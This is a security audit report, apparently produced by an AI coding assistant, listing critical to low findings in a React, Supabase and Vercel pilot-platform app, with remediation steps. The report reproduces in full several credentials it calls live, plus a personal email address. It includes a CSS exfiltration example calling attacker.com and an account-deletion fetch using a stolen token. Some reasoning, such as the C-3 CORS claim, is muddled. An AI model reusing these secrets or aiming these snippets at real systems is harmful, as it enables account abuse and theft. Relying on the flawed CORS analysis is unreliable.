# Security Audit Report — 2026-06-08
**Auditor:** Cline (automated static review)
**Scope:** `app-main` (Vite/React + Supabase Edge Functions + Vercel API routes)
**Method:** Source-code review of security middleware, auth, RLS, API routes, components, and configuration
**Reference docs reviewed:** `SECURITY_AUDIT_REPORT.md`, `SECURITY_FIXES_APPLIED_2026-06-08.md`, `SECURITY_ARCHITECTURE.md`

---

## Executive Summary

The app has a solid baseline: MFA, CSRF (timing-safe), CSRF cookie `HttpOnly/Secure/SameSite=Strict`, `timingSafeEqual` comparison, RLS on most tables, and CSP via `vercel.json`. **However, my review surfaced one CRITICAL secret leak in `.env.local`, two CRITICAL authentication gaps in API routes, and several HIGH-severity issues that could allow account takeover, wallet hijack, or DoS.**

| Severity | Count | Status |
|---|---|---|
| 🔴 CRITICAL | 4 | 0 fixed — **must remediate before next deploy** |
| 🟠 HIGH | 6 | 0 fixed |
| 🟡 MEDIUM | 7 | 0 fixed |
| 🟢 LOW | 5 | 0 fixed |
| **Total** | **22** | |

> `npm audit` reports **0 vulnerabilities** (good), and the prior `dompurify 3.4.1` fix is reflected. The issues below are application-level / configuration-level.

---

## 🔴 CRITICAL — Immediate Action Required

### C-1. EU Supabase anon key committed to `.env.local` as a real JWT
**File:** `.env.local:137-138`
```
VITE_SUPABASE_URL_EU=https://vxivswfqauqxrwvqrvqj.supabase.co
VITE_SUPABASE_ANON_KEY_EU=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOi...STkjnU
```

- The EU project's anon key is a **real, fully-decoded JWT** (the value is a base64url JWT and matches a live-looking payload). It lives in a file whose comment says *"Copy this file to .env.local"*.
- `.env.local` is **covered by the `*.local` gitignore** — but the file is already in the working tree and may be tracked or previously committed. Verify with `git log --all -- .env.local`.
- The `VITE_*` namespace means it is **embedded in the production client bundle** by design. That's the intent for Supabase anon keys (they're public), but **rotating the EU project key is now required** because the value is plainly visible in the repo.
- **Same problem exists for the World project key** (`.env.local:133` is the placeholder `your_world_project_anon_key_here` — fine, but the *EU* one was filled in).

**Action:**
1. `git log --all -p -- .env.local | head -200` to see if it was committed.
2. Rotate the EU Supabase anon key in the Supabase dashboard.
3. If `.env.local` was ever committed, scrub it from history (`git filter-repo` or BFG).
4. Replace the literal JWT with a placeholder (`VITE_SUPABASE_ANON_KEY_EU=your_eu_project_anon_key_here`) and document that the real value must come from Vercel/Supabase secrets.

### C-2. `api/wallet/create.ts` has zero authentication
**File:** `api/wallet/create.ts:23-150`
- No JWT check, no Auth0 check, no Supabase session check.
- Accepts arbitrary `{ pilotId, email, password, issuers }` from any caller.
- The `password` field (line 5) is forwarded to Truvera — looks like it's the **wallet password** that protects W3C VCs, not the user's login password, but since there's no link between caller and `pilotId` anyone can create a wallet under any pilot's identity.
- A `X-Pilot-Id` header (line 71) is even sent to Truvera, exposing arbitrary pilot IDs.
- CORS allows `Access-Control-Allow-Origin: *` *with* `Access-Control-Allow-Credentials: true` (lines 28-29) — a textbook **CSRF / cross-origin wallet takeover** when combined with the missing auth.

**Impact:** Any internet user can create a Truvera wallet bound to any `pilotId`. Combined with the permissive CORS, a malicious site can do it from a victim's browser.

**Action:** Convert this to a Supabase Edge Function, require `Authorization: Bearer <jwt>`, derive `pilotId` server-side from the JWT, and restrict CORS to the allowlist in `supabase/functions/_shared/cors.ts`. Remove `*` from `Allow-Origin`.

### C-3. `api/wallet/create.ts` CORS: `Allow-Origin: *` + `Allow-Credentials: true`
**File:** `api/wallet/create.ts:28-29`
```
res.setHeader('Access-Control-Allow-Credentials', 'true');
res.setHeader('Access-Control-Allow-Origin', '*');
```
Browsers reject this combination, **but** server-side clients (curl, server-rendered pages, malicious same-origin script) bypass the browser enforcement. Combined with C-2 above, this is a wallet-creation exploit.

**Action:** Replace `*` with the allowed-origin list (or echo the validated `Origin` per the shared `cors.ts` pattern).

### C-4. `delete-account` Edge Function uses permissive CORS
**File:** `supabase/functions/delete-account/index.ts:10-17`, `_shared/cors.ts:17-31`
- `cors.ts` *does* restrict to the allowlist + localhost. ✅
- However, `delete-account` accepts both `DELETE` and `POST` (line 16), and the authentication path is via `Authorization: Bearer <jwt>` only. There is **no CSRF token check** (intentionally — the prior audit noted this).
- A logged-in pilot visiting an attacker page can be force-deleted via `fetch('…/delete-account', {method:'POST', credentials:'include', headers:{Authorization:'Bearer '+stolen}})` — but that requires the attacker to also possess the JWT, which is HttpOnly so it should not be readable from JS. The risk is **low** in practice, but the function performs an **irreversible destructive action** without MFA re-auth or step-up auth. The client side (`UnifiedPilotPlatform.tsx`) does call passkey verification before invoking, but **the server does not enforce it** — a custom client could skip it.

**Action:** Add a server-side check that the request includes a `passkey_verified: true` field set only after a successful passkey assertion, OR require an MFA TOTP code in the request body, OR require a short-lived "delete intent" token issued by `passkey-verify` and consumed by `delete-account`.

---

## 🟠 HIGH Severity

### H-1. `api-gateway` forwards `X-User-ID` / `X-User-Email` headers without re-validation contract
**File:** `supabase/functions/api-gateway/index.ts:381-387`
- The gateway validates JWT and sets `X-User-ID`/`X-User-Email` on the proxied request (line 384-387).
- This is a common pattern, but **only safe if every downstream function re-validates the JWT** instead of trusting the headers.
- A scan of the function list shows 64+ Edge Functions, but I could not enumerate all of them in this audit window. **Any function that does `const userId = req.headers.get('X-User-ID')` for an authorization decision is vulnerable to spoofing** if a request bypasses the gateway (e.g., direct invocation via `supabase.functions.invoke` from a client — the function is publicly invokable unless `verify_jwt = true` in the function config).

**Action:**
1. Audit every function's `supabase/config.toml` to ensure `verify_jwt = true` for any that should be auth-gated.
2. Replace `X-User-ID` reads with `supabase.auth.getUser(jwt)` calls.
3. Remove the `X-User-ID`/`X-User-Email` forwarding entirely, or rename to `X-Gateway-Validated-User-Id` with documentation that it must NOT be used for authz.

### H-2. `api/enterprise-access/index.ts` uses in-memory rate limiting
**File:** `api/enterprise-access/index.ts:6-25`
- `requestLimits` Map is per-instance. Vercel serverless functions can cold-start on every request — a single attacker can bypass the 5/hour limit by triggering cold starts (or by simply spreading across the Vercel edge's many instances).
- The IP source is `x-forwarded-for` and `x-client-ip` (line 51-53), which are **client-spoofable** headers when the request doesn't go through a trusted proxy. Vercel sets `X-Forwarded-For` from the client — that **is** the client IP, so it's actually fine here for Vercel. But the in-memory store is the real issue.

**Action:** Use a distributed rate limiter — Supabase `api_rate_limits` table (already created — `20260602_api_rate_limits.sql`), or Vercel KV / Upstash Redis.

### H-3. `api/sso/consume.ts` — long-lived session token (7 days) and broad SSO trust
**File:** `api/sso/consume.ts:52-72`
- Signed JWT has `exp = now + 7 days` and is set as `pcp_sess` cookie scoped to `pilotcareerpathways.com`.
- Cookie is `HttpOnly; Secure; SameSite=None` (required for cross-site SSO navigation) — same-site mitigation is effectively disabled.
- A leak of this cookie (e.g., a downstream XSS on `pilotcareerpathways.com`) grants 7 days of `pilotrecognition.com` access with no MFA re-prompt.
- The redirect allowlist (line 75) is good. The cookie domain restriction is good.

**Action:** Reduce to 24h with sliding refresh; require MFA re-prompt for sensitive operations on the receiving site.

### H-4. `auth-signup` writes to `profiles` without re-checking `origin_jurisdiction` write perms
**File:** `supabase/functions/auth-signup/index.ts:91-98`; `supabase/functions/_shared/ip-geofencing.ts:166-178`
- `setOriginJurisdiction` runs an `update({ origin_jurisdiction: 'XX' })` on a freshly created profile. If the `profiles` table RLS policy allows `UPDATE` on `origin_jurisdiction` for any user, a malicious user could later **change their data-residency classification** (e.g., move from EU to non-EU) to bypass GDPR controls.
- I did not see the profiles RLS policies in the migrations folder (only 7 migrations exist, none define profiles RLS — they may live in a base schema I cannot see in this scope).

**Action:** Verify that `profiles` RLS restricts `origin_jurisdiction` updates to `service_role` only.

### H-5. `api-gateway` IP-based rate limit is bypassable
**File:** `supabase/functions/api-gateway/index.ts:529-532`
- Uses `CF-Connecting-IP || X-Forwarded-For` for the bucket key. Behind Cloudflare, the gateway will see real client IPs. **But** the gateway also caches responses and the rate-limit `key` does not include the route, so cached responses don't consume rate-limit budget for cacheable routes — an attacker can spam the cache key without rate-limiting.
- The in-memory `rateLimitStore` (line 292) is **not shared across function instances**, so the 100/min budget can be effectively unlimited under load.

**Action:** Switch to the database-backed rate limiter (already partially implemented) and include the full route+method in the cache key.

### H-6. `api/enterprise-access/index.ts` recipient email is hardcoded
**File:** `api/enterprise-access/index.ts:112`
- `to: ['benjamintigerbowler@gmail.com']` is hardcoded.
- The `.env.local` defines `ENTERPRISE_NOTIFICATION_EMAILS` (line 124) for this purpose but **is never read**. Anyone reading the public code can see the destination address (a Gmail, not a corporate domain), and any access request — including from competitors doing recon — is funneled to a single personal inbox without secondary review.
- The same Gmail address is hardcoded as the admin `VITE_ADMIN_EMAIL` in `.env.local:76`.

**Action:** Read `ENTERPRISE_NOTIFICATION_EMAILS` and parse it as a list. If empty, fail closed.

---

## 🟡 MEDIUM Severity

### M-1. XSS surface in `BlogArticlePage` is mitigated but not eliminated
**File:** `app/blog/[slug]/page.tsx:21-30, 214`
- Uses `sanitizeHtmlCustom` with an allowlist (good) and then `dangerouslySetInnerHTML`.
- The `sanitize-html` library version isn't pinned in `package.json` — only `@types/dompurify ^3.0.5` is present, but the import is from `@/src/lib/sanitize-html`. mXSS bypasses in `dompurify < 3.2.4` were common — the prior audit bumped `dompurify` but the **markdown pipeline** (`@/lib/blog/markdown`) is a separate code path that builds HTML, then passes to the sanitizer. If the sanitizer misses an attribute on `<a>` (e.g., `javascript:` in `href` with mixed case or HTML entity encoding), XSS results.

**Action:** Unit-test the sanitizer against known mXSS payloads; add explicit `allowedSchemes: ['http', 'https', 'mailto']` and force `target="_blank" rel="noopener noreferrer"` on all `<a>`.

### M-2. Multiple `dangerouslySetInnerHTML` call sites with JSON-LD
**Files:** `components/website/components/TopNavbar.tsx`, `FAQPage.tsx`, `HomePageSchema.tsx`, `NavigationSchema.tsx`, `BreadcrumbSchema.tsx`, `TechnicalIndexPage.tsx`
- All use `sanitizeJsonLd`. If `sanitizeJsonLd` ever throws or returns unsanitized content (e.g., on schema construction error), the JSON-LD can contain attacker-controlled data.
- TopNavbar uses `dangerouslySetInnerHTML={{ __html: sanitizeHtml(subItem.name) }}` for navigation item names — if the CMS/DB ever serves an untrusted `subItem.name`, this is XSS.

**Action:** Audit `subItem.name` data sources; wrap the render in a try/catch fallback to plain text.

### M-3. `ip-geofencing.ts` depends on third-party `ipapi.co` (no auth, public, rate-limited)
**File:** `supabase/functions/_shared/ip-geofencing.ts:79-86`
- `fetch('https://ipapi.co/${ipAddress}/json/')` is unauthenticated, free tier rate-limited (~1k/day), and returns 429 under load.
- A backup or non-Cloudflare deployment would have a hard dependency on this third party for compliance-driven routing.
- The CSP in `vercel.json` *does* allow `https://ipapi.co` in `connect-src` (good — but also means any compromised CDN on that domain can MITM edge functions during signup).

**Action:** Use `CF-IPCountry` header (Cloudflare) exclusively in production; fail closed (block signup) if jurisdiction cannot be determined.

### M-4. `public/W2000/services/firebase.ts` and `check_user.js` contain a live Firebase API key
**Files:** `public/W2000/services/firebase.ts`, `public/W2000/check_user.js`, `dist/W2000/services/firebase.ts`
```
apiKey: "AIzaSyAUO3L3fIrQFTLGEkgkeul38PwVwtV6EQc",
authDomain: "wingmentor-ab3ad.firebaseapp.com",
```
- Firebase client `apiKey` is **publicly embeddable by design** (Firebase security comes from Firestore rules, not key secrecy). ✅
- However, the Firestore rules (`firestore.rules`) only protect `profiles` and `pilot_roster`. The `pilot_roster` rules now require `request.auth.uid == resource.data.owner_id` (good — the prior fix). The Firebase project `wingmentor-ab3ad` should be checked in the GCP console to confirm the API key has the **Firebase API key restrictions** (HTTP referrer / API restrictions) configured in the Google Cloud Console. Without those, an attacker can use the key against other Firebase services.

**Action:** Add HTTP referrer restrictions (`*.pilotrecognition.com/*`) and API restrictions (Firebase only) to the `AIzaSyAUO3L3fIrQFTLGEkgkeul38PwVwtV6EQc` key in GCP.

### M-5. `ALL_MERGED.md` contains a live waltid `clientSecret` and HMAC `sharedSecret`
**File:** `ALL_MERGED.md` (search result excerpt)
```
clientSecret: "fzYFC6oAgbjozv8NoaXuOIfPxmT4XoVM",
sharedSecret = "ef23f749-7238-481a-815c-f0c2157dfa8e"
```
- Both are **long-lived shared secrets** checked into documentation. If the waltid issuer is a real production system, these values grant anyone with the document full read/issue rights.
- `ALL_MERGED.md` appears to be a developer-notes / merge log file (not user-facing) but is in the repo and could be exfiltrated via the `github.com/bendj1231/app-main` public remote.

**Action:** Rotate both secrets. Move to a private doc. Add a pre-commit hook scanning for `sharedSecret|clientSecret|apiKey|secret` literals.

### M-6. CSP in `vercel.json` has `'unsafe-eval'` not in script-src but CSP itself is locked down
**File:** `vercel.json:147`
- `script-src 'self'` — no `'unsafe-eval'`, no `'unsafe-inline'`. ✅ Good.
- However, `style-src 'self' 'unsafe-inline'` allows inline styles. Inline styles can be used for **CSS exfiltration attacks** (e.g., `background:url("//attacker.com/?leak="+data)`) when combined with attribute-injection in the markdown pipeline.

**Action:** Replace `'unsafe-inline'` styles with nonces/hashes, or accept the risk and add `Content-Security-Policy-Report-Only` headers to monitor violations.

### M-7. `package.json` includes server-side packages (mongodb, pg, express) in a Vite/React app
**File:** `package.json:39, 35, 40`
- `mongodb`, `pg`, `express` are listed as dependencies. If the client bundle inadvertently imports any of them, the source code (and connection strings) ships to the browser.
- These are likely used by Supabase Edge Functions, which run on Deno, not Node — so they should not be in the `npm` `dependencies` of this Vite app at all. They should be in a separate workspace / `functions/` package.

**Action:** Move server-only deps to a separate `functions/package.json` or import them dynamically only in Node-targeted files; ensure the Vite build does not pull them in.

---

## 🟢 LOW Severity

### L-1. `localStorage` stores passkey and OAuth flags (XSS-readable)
**Files:** `src/contexts/AuthContext.tsx`, `src/components/Analytics/ConsentBanner.tsx`, `src/routes/AppRoutes.tsx`
- `localStorage.setItem('explicitLogout', 'true')`, `pr_passkey_registered`, `oauthModalShown`, etc. None contain raw credentials, but they expose **user behavioral state** to any XSS payload (e.g., "did this user decline a passkey? target them for credential phishing").
- The passkey *credential IDs* are not stored in `localStorage` (good — they're in `pilot_passkeys` table), but the boolean flag that says "user has a passkey" is.

**Action:** Accept the risk; the data is non-sensitive. If a deeper defense is desired, move flags to HttpOnly cookies or to a backend session record.

### L-2. SSO redirect allowlist is short
**File:** `api/sso/consume.ts:75`
- `REDIRECT_ALLOWLIST = ['/', '/dashboard', '/profile', '/onboarding']`. If new pilotcareerpathways.com pages are added, this list will need updating. Easy to forget.
- Also, the allowlist strips query params (line 81 `pathname = redirect.split('?')[0]`) — so `/dashboard?token=...` would be checked as `/dashboard`. That's correct, but if `/onboarding?step=2` is later added, it will pass.

**Action:** Document the allowlist review in the deploy checklist.

### L-3. `cors.ts` echoes any localhost port
**File:** `supabase/functions/_shared/cors.ts:19-22`
- `origin.startsWith('http://localhost:')` matches any port. Combined with `http://` (not https) and the fact that Edge Functions may be hit by an attacker-controlled origin in dev mode, this is mostly a non-issue — but it does mean a malicious page on `http://localhost:9999` (e.g., a captive portal that resolved to localhost) could call your edge functions from a victim's browser.
- Not exploitable in production (the dev path requires a local browser), so LOW.

**Action:** Restrict to a known port range if production parity matters.

### L-4. CSRF cookie set without `__Host-` prefix
**Files:** `supabase/functions/_shared/security-middleware.ts:361-369`
- The CSRF token cookie is `csrf-token=…; Path=/; HttpOnly; Secure; SameSite=Strict` — but no `__Host-` prefix.
- `__Host-` cookies cannot be set by subdomains, preventing subdomain takeover attacks from planting CSRF tokens.

**Action:** Rename to `__Host-csrf-token` and update the matcher regex in `validateCSRFToken`. Apply same to `sb-access-token` and `sb-refresh-token`.

### L-5. No request size limit in api-gateway
**File:** `supabase/functions/api-gateway/index.ts:19` declares `MAX_REQUEST_SIZE: 10 * 1024 * 1024` but I see no enforcement code. The body is forwarded via `fetch(targetUrl, { body: req.body })` without a size check.

**Action:** Add explicit Content-Length check at the top of the handler and reject with 413 if > 10MB.

---

## 🟢 POSITIVE Findings (Security Wins Already in Place)

These are good defenses to keep:
- ✅ **CSRF**: timing-safe comparison via `crypto.timingSafeEqual` in `security-middleware.ts:343-356` (fixed in `SECURITY_FIXES_APPLIED_2026-06-08.md` item #1).
- ✅ **SSO redirect allowlist** — open-redirect closed (`api/sso/consume.ts:75-90`, fixed in #3).
- ✅ **COOKIE_SECRET** — no `NEXT_PUBLIC_` fallback (`api/sso/consume.ts:14-16`, fixed in #4).
- ✅ **Firestore pilot_roster RLS** — owner-only read/write (`firestore.rules:15-20`, fixed in #6).
- ✅ **dompurify 3.4.1** — `npm audit` clean (fixed in #9).
- ✅ **ATO activation credits RLS** — `TO service_role` only (fixed in #8).
- ✅ **enterprise-access rate limit + input validation + newline stripping** (fixed in #5).
- ✅ **MFA with TOTP + pgcrypto encryption** of secrets.
- ✅ **CSP via vercel.json** is locked down.
- ✅ **HSTS** with 2-year max-age and `preload`.
- ✅ **Webhook signature verification** with `timingSafeEqual` (`api/webhook/resend.ts:29-35`).
- ✅ **Forum admin policies** explicitly require `auth.uid() IS NOT NULL` and a role check (`20260530_psa_forum_system.sql:342-359`).
- ✅ **delete-account** has comprehensive coverage (24+ tables).

---

## Recommended Remediations — Priority Order

1. **TODAY** — C-1 (rotate EU Supabase key), C-2 (auth on `api/wallet/create.ts`), C-3 (CORS fix).
2. **THIS WEEK** — C-4 (passkey/MFA gate on delete-account), H-1 (audit all edge functions for `verify_jwt` and remove `X-User-ID` reliance), H-6 (read `ENTERPRISE_NOTIFICATION_EMAILS`), H-2 (distributed rate limit on enterprise-access).
3. **THIS SPRINT** — H-3 (SSO 7-day → 24h), H-4 (verify profiles RLS for `origin_jurisdiction`), H-5 (DB-backed gateway rate limit).
4. **NEXT** — M-1..M-7, L-1..L-5.
5. **DEPLOY CHECKLIST** — Add `git log --all -p -- .env.local` to pre-commit; add a `gitleaks` or `trufflehog` pre-push hook.

---

## Files Reviewed
- `SECURITY_AUDIT_REPORT.md`, `SECURITY_FIXES_APPLIED_2026-06-08.md`, `SECURITY_ARCHITECTURE.md`
- `.env.local`, `vercel.json`, `firestore.rules`, `package.json`
- `supabase/functions/_shared/{security-middleware,cors,ip-geofencing}.ts`
- `supabase/functions/api-gateway/index.ts`
- `supabase/functions/{auth-signup,auth-verify,delete-account}/index.ts` (sampled)
- `supabase/migrations/*.sql` (all 8 migrations)
- `api/{sso/consume,wallet/create,enterprise-access/index,webhook/resend}.ts`
- `app/blog/[slug]/page.tsx`, `components/website/components/*.tsx` (XSS scan)
- `src/contexts/AuthContext.tsx`, `src/lib/{auth0,supabase-oauth}.ts` (auth flow)
- `UnifiedPilotPlatform.tsx` (delete-account client flow)

## Files Not Reviewed (Out of Scope / Time)
- 60+ other Edge Functions (audit of `verify_jwt` per function recommended)
- `app/blog/` markdown loader + sanitizer unit-test coverage
- E2E test suite (`tests/`)
- Build-time secret scanning
- Cloudinary / R2 / Resend key rotation history

---

**Report generated:** 2026-06-08 (Asia/Manila)
**Next review:** Recommend in 30 days after C-1..C-3, H-1, H-2 are remediated.
